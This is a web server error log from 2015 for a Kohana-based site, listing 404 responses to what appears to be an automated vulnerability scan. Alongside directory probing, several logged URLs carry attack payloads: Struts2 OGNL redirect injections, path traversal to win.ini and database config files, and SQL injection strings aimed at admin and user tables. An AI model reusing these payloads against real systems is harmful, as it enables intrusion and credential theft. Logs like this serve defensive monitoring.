2015-04-24 00:04:10 uri:/robots.txt; code:404; msg:Unable to find a route to match the URI: robots.txt-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: robots.txt ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:
2015-04-24 18:15:54 uri:/item/db/; code:404; msg:The requested URL item/db was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL item/db was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/item/list4contr
2015-04-24 18:15:57 uri:/item/upload/; code:404; msg:The requested URL item/upload was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL item/upload was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/item/list4contr
2015-04-24 18:15:58 uri:/item/uploads/; code:404; msg:The requested URL item/uploads was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL item/uploads was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/item/list4contr
2015-04-24 18:16:02 uri:/item/data/; code:404; msg:The requested URL item/data was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL item/data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/item/list4contr
2015-04-24 18:16:03 uri:/item/web/; code:404; msg:The requested URL item/web was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL item/web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/item/list4contr
2015-04-24 18:16:04 uri:/item/uploadfiles/; code:404; msg:The requested URL item/uploadfiles was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL item/uploadfiles was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/item/list4contr
2015-04-24 18:16:07 uri:/item/uploadfile/; code:404; msg:The requested URL item/uploadfile was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL item/uploadfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/item/list4contr
2015-04-24 18:16:08 uri:/item/upfiles/; code:404; msg:The requested URL item/upfiles was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL item/upfiles was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/item/list4contr
2015-04-24 18:16:11 uri:/shop/index.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D; code:404; msg:Unable to find a route to match the URI: shop/index.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shop/index.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:12 uri:/item/upfile/; code:404; msg:The requested URL item/upfile was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL item/upfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/item/list4contr
2015-04-24 18:16:13 uri:/item/htdocs/; code:404; msg:The requested URL item/htdocs was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL item/htdocs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/item/list4contr
2015-04-24 18:16:33 uri:/shop/login.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D; code:404; msg:Unable to find a route to match the URI: shop/login.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shop/login.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:34 uri:/shop/admin.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D; code:404; msg:Unable to find a route to match the URI: shop/admin.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shop/admin.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:35 uri:/shop/login.action?debug=browser; code:404; msg:Unable to find a route to match the URI: shop/login.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shop/login.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:36 uri:/shop/admin.action?debug=browser; code:404; msg:Unable to find a route to match the URI: shop/admin.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shop/admin.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:37 uri:/shop/index.action?debug=browser; code:404; msg:Unable to find a route to match the URI: shop/index.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shop/index.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:38 uri:/shop/log/; code:404; msg:The requested URL shop/log was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/log was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:41 uri:/shop/logs/; code:404; msg:The requested URL shop/logs was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/logs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:42 uri:/shop/config/; code:404; msg:The requested URL shop/config was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/config was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:43 uri:/shop/db/; code:404; msg:The requested URL shop/db was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/db was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:44 uri:/shop/upload/; code:404; msg:The requested URL shop/upload was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/upload was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:46 uri:/shop/uploads/; code:404; msg:The requested URL shop/uploads was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/uploads was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:47 uri:/shop/backup/; code:404; msg:The requested URL shop/backup was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/backup was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:48 uri:/shop/data/; code:404; msg:The requested URL shop/data was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:49 uri:/shop/web/; code:404; msg:The requested URL shop/web was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:50 uri:/shop/uploadfiles/; code:404; msg:The requested URL shop/uploadfiles was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/uploadfiles was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:51 uri:/shop/uploadfile/; code:404; msg:The requested URL shop/uploadfile was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/uploadfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:54 uri:/shop/upfiles/; code:404; msg:The requested URL shop/upfiles was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/upfiles was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:54 uri:/outImg?imgPath=c%3A%5Cwindows%5Cwin.ini; code:404; msg:The requested URL outImg was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL outImg was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://121.40.211.61
2015-04-24 18:16:57 uri:/shop/upfile/; code:404; msg:The requested URL shop/upfile was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/upfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:16:58 uri:/shop/htdocs/; code:404; msg:The requested URL shop/htdocs was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/htdocs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/shop/show
2015-04-24 18:17:04 uri:/outImg?imgPath=c%3A%5Cwindows%5Cwin.ini; code:404; msg:The requested URL outImg was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL outImg was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://121.40.211.61
2015-04-24 18:17:05 uri:/cgi-bin/authlogin.cgi; code:404; msg:Unable to find a route to match the URI: cgi-bin/authlogin.cgi-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/authlogin.cgi ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-24 18:17:06 uri:/cgi-bin/it.cgi; code:404; msg:Unable to find a route to match the URI: cgi-bin/it.cgi-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/it.cgi ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-24 18:17:07 uri:/cgi-bin/test-cgi; code:404; msg:The requested URL cgi-bin/test-cgi was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/test-cgi was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://121.40.211.61
2015-04-24 18:17:08 uri:/cgi-sys/defaultwebpage.cgi; code:404; msg:Unable to find a route to match the URI: cgi-sys/defaultwebpage.cgi-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/defaultwebpage.cgi ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-24 18:17:09 uri:/cgi-sys/FormMail-clone.cgi; code:404; msg:Unable to find a route to match the URI: cgi-sys/FormMail-clone.cgi-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/FormMail-clone.cgi ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-24 18:17:15 uri:/webscan38502863.txt; code:404; msg:Unable to find a route to match the URI: webscan38502863.txt-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webscan38502863.txt ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-24 18:17:16 uri:/webscan38502863.txt; code:404; msg:Unable to find a route to match the URI: webscan38502863.txt-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webscan38502863.txt ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-24 18:17:18 uri:/plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%207,8,Int(655366553-10241024),10,now%28%29,null,1%20%20frmasterom%20%7Bprefix%7Duser; code:404; msg:Unable to find a route to match the URI: plug/comment/commentList.asp-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: plug/comment/commentList.asp ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-24 18:17:22 uri:/NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2BInt(655366553-10241024),2,3,4,5,6,7,8,9%20%66%72%6F%6D%20%61%64%6D%69%6E; code:404; msg:Unable to find a route to match the URI: NewsType.asp-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: NewsType.asp ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-24 18:17:23 uri:/admin/others.asp?mudi=download_EN_CN&n=index.asp&ENname=../config.asp; code:404; msg:Unable to find a route to match the URI: admin/others.asp-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/others.asp ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-24 18:17:26 uri:/index.php/api/xmlrpc; code:404; msg:Unable to find a route to match the URI: index.php/api/xmlrpc-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php/api/xmlrpc ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-24 18:17:29 uri:/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-24 18:17:30 uri:/User/UserZone/School/Download.aspx?f=..%5C..%5C..%5CConfig%5CConnectionStrings.config; code:404; msg:Unable to find a route to match the URI: User/UserZone/School/Download.aspx-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: User/UserZone/School/Download.aspx ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-24 18:17:32 uri:/index.php?jobs=show&label_hf%5B1'%20and%20extractvalue(1,concat(0x5c,(select%20concat(username,md5(233333))%20from%20qb_members%20limit%201)))%23%5D%5B2%5D=asd; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-24 18:17:35 uri:/index.php; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-24 18:17:36 uri:/index.php?c=api&a=down&file=ZDlhMi96WnAvcGtoNWVPNTRxTmtIYVV4Vnp1VjFFbkRlVmJvMGdWQlVaSFZldksvVzV4SGJ; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-24 18:17:37 uri:/mailmain?intertype=ajax&type=getAllUserList_simple; code:404; msg:The requested URL mailmain was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL mailmain was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://121.40.211.61
